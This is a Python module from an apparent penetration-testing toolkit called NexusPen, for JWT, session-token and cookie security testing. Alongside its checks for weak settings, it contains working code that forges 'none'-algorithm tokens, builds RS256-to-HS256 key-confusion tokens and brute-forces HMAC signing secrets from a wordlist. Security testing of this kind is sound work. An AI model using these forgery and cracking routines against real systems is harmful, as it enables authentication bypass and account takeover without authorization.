#!/usr/bin/env python3
"""
NexusPen - JWT and Session Security Module
===========================================
JWT and session token security testing.
"""

import base64
import json
import hmac
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class JWTVulnerability:
    """JWT vulnerability finding."""
    vuln_type: str
    severity: str
    description: str
    evidence: Optional[str] = None
    exploit_payload: Optional[str] = None


class JWTAnalyzer:
    """
    JWT token analyzer and attack generator.
    """
    
    def __init__(self, token: str):
        self.token = token
        self.header = {}
        self.payload = {}
        self.signature = ''
        self.vulnerabilities: List[JWTVulnerability] = []
        
        self._decode()
    
    def _decode(self):
        """Decode JWT token."""
        try:
            parts = self.token.split('.')
            
            if len(parts) != 3:
                console.print("[red]Invalid JWT format[/red]")
                return
            
            # Decode header
            self.header = json.loads(
                base64.urlsafe_b64decode(parts[0] + '==')
            )
            
            # Decode payload
            self.payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + '==')
            )
            
            self.signature = parts[2]
            
        except Exception as e:
            console.print(f"[red]Decode error: {e}[/red]")
    
    def display_info(self):
        """Display JWT information."""
        console.print("\n[bold cyan]═══ JWT Analysis ═══[/bold cyan]")
        
        console.print("\n[cyan]Header:[/cyan]")
        console.print(json.dumps(self.header, indent=2))
        
        console.print("\n[cyan]Payload:[/cyan]")
        console.print(json.dumps(self.payload, indent=2))
        
        console.print(f"\n[cyan]Signature:[/cyan] {self.signature[:20]}...")
    
    def analyze_vulnerabilities(self) -> List[JWTVulnerability]:
        """Analyze token for vulnerabilities."""
        console.print("\n[cyan]🔍 Analyzing JWT vulnerabilities...[/cyan]")
        
        # Check algorithm
        alg = self.header.get('alg', '')
        
        # None algorithm
        if alg.lower() in ['none', '']:
            vuln = JWTVulnerability(
                vuln_type='None Algorithm',
                severity='critical',
                description='Algorithm set to "none" allows unsigned tokens',
                evidence=f'alg: {alg}'
            )
            self.vulnerabilities.append(vuln)
            console.print("[red]  ⚠️ None algorithm accepted![/red]")
        
        # Weak algorithm
        if alg.upper() in ['HS256', 'HS384', 'HS512']:
            vuln = JWTVulnerability(
                vuln_type='Symmetric Algorithm',
                severity='medium',
                description='HMAC algorithm may be vulnerable to key confusion attacks',
                evidence=f'alg: {alg}'
            )
            self.vulnerabilities.append(vuln)
            console.print("[yellow]  ⚠️ Symmetric algorithm - check for key confusion[/yellow]")
        
        # Check claims
        exp = self.payload.get('exp')
        if not exp:
            vuln = JWTVulnerability(
                vuln_type='No Expiration',
                severity='medium',
                description='Token has no expiration claim',
            )
            self.vulnerabilities.append(vuln)
            console.print("[yellow]  ⚠️ No expiration set[/yellow]")
        
        # Check for sensitive data
        sensitive_fields = ['password', 'secret', 'key', 'ssn', 'credit']
        for field in sensitive_fields:
            if field in str(self.payload).lower():
                vuln = JWTVulnerability(
                    vuln_type='Sensitive Data Exposure',
                    severity='high',
                    description=f'Sensitive field "{field}" in payload',
                    evidence=json.dumps(self.payload)[:200]
                )
                self.vulnerabilities.append(vuln)
                console.print(f"[red]  ⚠️ Sensitive data in payload: {field}[/red]")
        
        # Check for JKU/X5U injection
        if 'jku' in self.header or 'x5u' in self.header:
            vuln = JWTVulnerability(
                vuln_type='JKU/X5U Header Injection',
                severity='high',
                description='JKU or X5U header present - may be vulnerable to key injection',
                evidence=f"jku: {self.header.get('jku')}, x5u: {self.header.get('x5u')}"
            )
            self.vulnerabilities.append(vuln)
            console.print("[red]  ⚠️ JKU/X5U header present![/red]")
        
        return self.vulnerabilities
    
    def generate_none_attack(self) -> str:
        """Generate token with 'none' algorithm."""
        new_header = self.header.copy()
        new_header['alg'] = 'none'
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def generate_hs256_attack(self, public_key: str) -> str:
        """Generate RS256 to HS256 confusion attack."""
        new_header = self.header.copy()
        new_header['alg'] = 'HS256'
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        
        # Sign with public key as HMAC secret
        signature = hmac.new(
            public_key.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{message}.{sig_b64}"
    
    def modify_payload(self, modifications: Dict) -> str:
        """Modify payload and re-encode (unsigned)."""
        new_payload = self.payload.copy()
        new_payload.update(modifications)
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(self.header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(new_payload).encode()
        ).decode().rstrip('=')
        
        # Return with empty signature for none attack
        return f"{header_b64}.{payload_b64}."
    
    def brute_force_secret(self, wordlist: List[str], 
                          algorithm: str = 'HS256') -> Optional[str]:
        """Brute force JWT secret."""
        console.print("\n[cyan]🔓 Brute forcing JWT secret...[/cyan]")
        
        parts = self.token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        target_sig = parts[2]
        
        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }.get(algorithm, hashlib.sha256)
        
        for secret in wordlist:
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()
            
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            if sig_b64 == target_sig:
                console.print(f"[green]  ✓ Secret found: {secret}[/green]")
                return secret
        
        return None


class SessionAnalyzer:
    """
    Session token analyzer.
    """
    
    def __init__(self, tokens: List[str]):
        self.tokens = tokens
    
    def analyze_entropy(self) -> Dict:
        """Analyze token entropy and randomness."""
        console.print("\n[cyan]📊 Analyzing session entropy...[/cyan]")
        
        import string
        
        results = {
            'avg_length': 0,
            'charset': set(),
            'pattern_detected': False,
            'sequential': False,
        }
        
        lengths = [len(t) for t in self.tokens]
        results['avg_length'] = sum(lengths) / len(lengths)
        
        for token in self.tokens:
            results['charset'].update(set(token))
        
        results['charset'] = ''.join(sorted(results['charset']))
        
        # Check for sequential patterns
        if len(self.tokens) >= 2:
            try:
                nums = [int(t, 16) for t in self.tokens]
                diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                if len(set(diffs)) == 1:
                    results['sequential'] = True
                    results['pattern_detected'] = True
                    console.print("[red]  ⚠️ Sequential tokens detected![/red]")
            except:
                pass
        
        console.print(f"  Average length: {results['avg_length']:.0f}")
        console.print(f"  Charset: {results['charset'][:50]}...")
        
        return results
    
    def detect_encoding(self, token: str) -> str:
        """Detect token encoding."""
        import re
        
        # Base64
        if re.match(r'^[A-Za-z0-9+/=]+$', token):
            try:
                decoded = base64.b64decode(token)
                return 'base64'
            except:
                pass
        
        # Hex
        if re.match(r'^[0-9a-fA-F]+$', token):
            return 'hex'
        
        # URL encoded
        if '%' in token:
            return 'url_encoded'
        
        # JWT
        if token.count('.') == 2:
            return 'jwt'
        
        return 'unknown'
    
    def check_predictability(self) -> bool:
        """Check if tokens are predictable."""
        console.print("\n[cyan]🎲 Checking predictability...[/cyan]")
        
        if len(self.tokens) < 3:
            console.print("[dim]  Need more tokens for analysis[/dim]")
            return False
        
        # Check for timestamp patterns
        import time
        current_ts = int(time.time())
        
        for token in self.tokens:
            try:
                # Check if token contains timestamp
                if str(current_ts)[:8] in token:
                    console.print("[yellow]  ⚠️ Timestamp-based token detected[/yellow]")
                    return True
            except:
                pass
        
        return False


class CookieAnalyzer:
    """
    Cookie security analyzer.
    """
    
    def __init__(self, cookies: Dict):
        self.cookies = cookies
    
    def analyze_security_flags(self, cookie_name: str, 
                              cookie_obj) -> List[Dict]:
        """Analyze cookie security flags."""
        console.print(f"\n[cyan]🍪 Analyzing cookie: {cookie_name}[/cyan]")
        
        issues = []
        
        # Check HttpOnly
        if not getattr(cookie_obj, 'has_nonstandard_attr', lambda x: False)('HttpOnly'):
            if not cookie_obj._rest.get('HttpOnly', False) if hasattr(cookie_obj, '_rest') else True:
                issues.append({
                    'flag': 'HttpOnly',
                    'severity': 'medium',
                    'description': 'Cookie accessible via JavaScript (XSS risk)'
                })
                console.print("[yellow]  ⚠️ Missing HttpOnly flag[/yellow]")
        
        # Check Secure
        if not cookie_obj.secure:
            issues.append({
                'flag': 'Secure',
                'severity': 'high',
                'description': 'Cookie sent over HTTP (interception risk)'
            })
            console.print("[red]  ⚠️ Missing Secure flag[/red]")
        
        # Check SameSite
        samesite = getattr(cookie_obj, 'samesite', None)
        if not samesite or samesite.lower() not in ['strict', 'lax']:
            issues.append({
                'flag': 'SameSite',
                'severity': 'medium',
                'description': 'Cookie vulnerable to CSRF attacks'
            })
            console.print("[yellow]  ⚠️ Missing or weak SameSite flag[/yellow]")
        
        # Check expiration
        if cookie_obj.expires is None:
            issues.append({
                'flag': 'Expires',
                'severity': 'low',
                'description': 'Session cookie (cleared on browser close)'
            })
        
        return issues
    
    @staticmethod
    def recommended_flags() -> str:
        """Get recommended cookie settings."""
        return '''
Recommended Cookie Configuration:
================================
Set-Cookie: session=abc123; 
    HttpOnly;           # Prevents JavaScript access
    Secure;             # Only sent over HTTPS
    SameSite=Strict;    # Prevents CSRF
    Path=/;             # Limit scope
    Max-Age=3600;       # 1 hour expiration
    Domain=example.com; # Limit domain

For API tokens:
Set-Cookie: token=xyz789;
    HttpOnly;
    Secure;
    SameSite=Lax;
    Path=/api;
'''
